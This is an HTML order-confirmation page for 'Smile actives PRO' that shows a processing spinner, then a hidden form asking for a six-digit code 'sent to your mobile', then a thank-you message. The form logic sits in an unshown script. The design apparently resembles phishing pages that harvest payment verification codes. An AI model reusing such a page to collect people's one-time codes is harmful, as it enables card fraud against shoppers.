<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
<style>
        body, h1, h2, h4, p, label {
            font-family: 'Montserrat', sans-serif;
            color: #333;
        }

        .spinner-container,
        .thanks-container,
        .otp-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }

        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border-left-color: #3498db;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 1rem;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .thanks-container img {
            width: 50%;
            height: auto;
            margin-bottom: 2rem;
        }

        .thanks-container h1 {
            margin-bottom: 1.5rem;
        }

        .logo {
            width: 60%;
            margin-bottom: 20px;
        }

        .otp-container-2 {
            background-color: #fff;
            padding: 20px;
            border: 1px solid #ddd;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
        }

        .otp-container-2 .otp-inputs input {
            border: 1px solid #aaa;
            margin: 5px;
            font-size: 22px;
            background-color: #f9f9f9;
            color: #555;
            width: 35px;
            height: 45px;
            text-align: center;
            border-radius: 3px;
            transition: box-shadow 0.3s;
        }

        .otp-container-2 .otp-inputs input:focus {
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
        }

        .btn-2 {
            background-color: #9FE870;
            color: #163300;
            padding: 10px 25px;
            border: none;
            border-radius: 3px;
            margin-top: 25px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn-2:hover {
            background-color: #73d636;
        }

        /* Hide the OTP and thank you sections initially */
        .otp-container {
            display: none;
        }

        .thanks-container {
            display: none;
        }
    </style>
</head>

<body>
    <!-- Spinner Container -->
    <div class="spinner-container">
        <div class="spinner"></div>
        <p>Order being processed... Please wait</p>
    </div>

    <!-- OTP Container -->
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 otp-container otp-container-2">
                <img src="path-to-your-logo.png" alt="Your Logo" class="logo">
                <h2>Please Confirm</h2>
                <p>Enter the code sent to your mobile:</p>
                <div class="otp-inputs">
<input type="text" maxlength="1">
                    <input type="text" maxlength="1">
                    <input type="text" maxlength="1">
                    <input type="text" maxlength="1">
                    <input type="text" maxlength="1">
                    <input type="text" maxlength="1">
                </div>
                <button class="btn-2" onclick="submitOTP()">Confirm</button>
            </div>
        </div>
    </div>

    <!-- Thanks Container -->
    <div class="container thanks-container">
        <img src="images/sa-2022-logo.png" alt="Logo">
        <h1 class="display-4">Thank You For purchasing Smile actives PRO!</h1>
        <p class="lead">Your order number is #SA339868. Please note that orders take 1-3 days to be processed and shipping times vary between 5 and 7 business days.</p>
        <a class="btn btn-primary" href="index.html">Continue Shopping</a>
    </div>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="thanks.js"></script>
</body>

</html>
